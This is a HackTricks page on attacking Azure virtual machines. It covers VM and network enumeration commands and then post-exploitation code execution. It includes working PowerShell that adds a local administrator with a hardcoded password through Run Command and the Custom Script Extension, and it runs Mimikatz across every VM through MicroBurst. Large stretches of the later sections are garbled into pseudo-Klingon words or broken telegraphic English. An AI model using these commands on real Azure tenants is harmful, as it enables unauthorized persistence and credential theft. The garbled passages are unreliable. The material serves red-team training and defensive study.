# Az - Virtual Machines & Network

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic information

[From the docs:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtual machines are one of several types of [on-demand, scalable computing resources](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) that Azure offers. Typically, you choose a virtual machine when you need more control over the computing environment than the other choices offer. This article gives you information about what you should consider before you create a virtual machine, how you create it, and how you manage it.

## Azure Network Information

Azure networks contains **different entities and ways to configure it.** You can find a brief **descriptions,** **examples** and **enumeration** commands of the different Azure network entities in:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** offers a secure, fully managed RDP (Remote Desktop Protocol) and SSH (Secure Shell) access solution over SSL through the Azure portal. It's integrated within an Azure Virtual Network, allowing RDP and SSH connectivity to VMs using private IPs, avoiding the need for public IPs. This makes it a safer, more convenient alternative to traditional methods involving public IP assignments and NSG rule configurations for VM access. Developers and IT personnel can securely access VMs from the Azure portal using their web browsers, streamlining the process for development and testing environments.

To list all Azure Bastion Hosts in your subscription, you can use the following command:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Enumeration

### Introduction

VM enumeration is the process of gathering information about virtual machines (VMs) in order to gain a better understanding of their configuration and potential vulnerabilities. This information can be used to plan and execute effective attacks against the VMs.

### Techniques

#### 1. Azure Resource Manager (ARM) APIs

Azure Resource Manager (ARM) APIs provide a set of RESTful APIs that can be used to interact with Azure VMs. These APIs allow you to retrieve information about VMs, such as their names, resource groups, and network configurations.

To enumerate VMs using ARM APIs, you can use tools like `az` command-line interface (CLI) or Azure PowerShell. These tools provide commands that allow you to query and retrieve information about VMs.

#### 2. Azure Portal

The Azure Portal is a web-based interface that allows you to manage and monitor your Azure resources, including VMs. By navigating to the Virtual Machines section in the Azure Portal, you can view a list of all the VMs in your subscription.

From the VM list, you can click on a specific VM to view its details, such as its name, resource group, and network configuration. This information can be useful for understanding the VM's configuration and potential vulnerabilities.

#### 3. Azure CLI

Azure CLI is a command-line tool that allows you to manage and interact with Azure resources, including VMs. With Azure CLI, you can use commands like `az vm list` to retrieve a list of all the VMs in your subscription.

The output of the `az vm list` command includes information about each VM, such as its name, resource group, and network configuration. This information can be used to identify potential vulnerabilities in the VMs.

#### 4. Azure PowerShell

Azure PowerShell is a scripting language that allows you to automate the management and configuration of Azure resources, including VMs. With Azure PowerShell, you can use cmdlets like `Get-AzVM` to retrieve information about VMs.

The output of the `Get-AzVM` cmdlet includes information about each VM, such as its name, resource group, and network configuration. This information can be used to identify potential vulnerabilities in the VMs.

### Conclusion

VM enumeration is an important step in the pentesting process, as it allows you to gather information about VMs and identify potential vulnerabilities. By using techniques like Azure Resource Manager APIs, Azure Portal, Azure CLI, and Azure PowerShell, you can effectively enumerate VMs in Azure and plan your attacks accordingly.
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **QapDI' VM vItlhutlh**

### **AAD Login VM**

AzureAD Daq 'e' vItlhutlh vItlhutlh. 'ej 'oH **linux VM** vItlhutlh: `ssh username@azure-corp.com@1.1.1.1` (vItlhutlh login vItlhutlh 'e' vItlhutlh email **azurecorp** vItlhutlh) 'ej 'oH error:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

**Qapla'** **ghItlh** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) **ghaH** **'ej** **code** **jatlh**, **email** **'ej** **password** **credentials** **ghaH** **'ej** **SSH** **connect** **'ej** **(user** **permissions** **SuvtaHvIS** **ghaH**: `Virtual Machine Administrator Login` **'ej** `Virtual Machine User Login` **role**).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Qap Custom Script Extension**

Azure virtual machine (VM) extensions are **lo'wI'** that provide post-deployment configuration and automation **nIvbogh** on **Azure VMs**. For example, if a virtual machine requires software installation, antivirus protection, or the ability to run a script inside it, you can use a VM extension.

Therefore, if you have access to write it, you can execute arbitrary code:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) jatlh PowerShell tool, Ansible jatlh, host setup code through. DSC Azure vaj upload configuration files. DSC standards, syntax not correct, DSC extension Azure vaj execute commands files, formatting criteria meet, example provided figure.

[**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) function Az PowerShell vaj facilitate execution commands. Requirements include **.PS1** file, defined function, **.zip** file vaj zip. DSC vaj execute code, even though syntax not accurate for DSC. However, extension execution status "failure" mark, failure message vaj overwrite status, command output not visible.

### VM Application Definitions

VM Application Definitions Azure VM vaj repeatable deployment versioned applications. VMs vaj application deployment update support. Setup involves steps, **`New-AzGalleryApplication`** and **`New-AzGalleryApplicationVersion`** commands Az PowerShell vaj.

Applications commands execution method **"VMAppExtension"**, application applied VM automatically install. Extension retrieves file specified URI, application name without extension. File execution correct, "ManageActions" field REST API call configured file rename appropriate extension. Setup resemble structure example provided figure.

However, execution method relatively slow, application command execution take 3-4 minutes. Files related process store specific directories (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` application copy, `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` execution status).

Both techniques unique ways commands execution application deployment Azure environments, each own requirements, steps, considerations.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) Azure feature, Runbooks, Automation Account configured, Azure Virtual Machine (VM) part designated HWG vaj execute. Execution facilitated extension installed VM, deploys Runbook code VM. Crucial aspect process actual credentials not factor execution, code elevated privileges, **SYSTEM** or root, example provided figure.

Windows 10 VMs utilize PowerShell version specification necessity Runbook. PowerShell Version 5.1 run specified, not 7.1. Requirement stems PowerShell 7.1 not installed default VMs, script execution failure if version 7.1 specified.

Azure feature robust method automate manage tasks hybrid environments, centralized management execution tasks Azure VMs.


## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
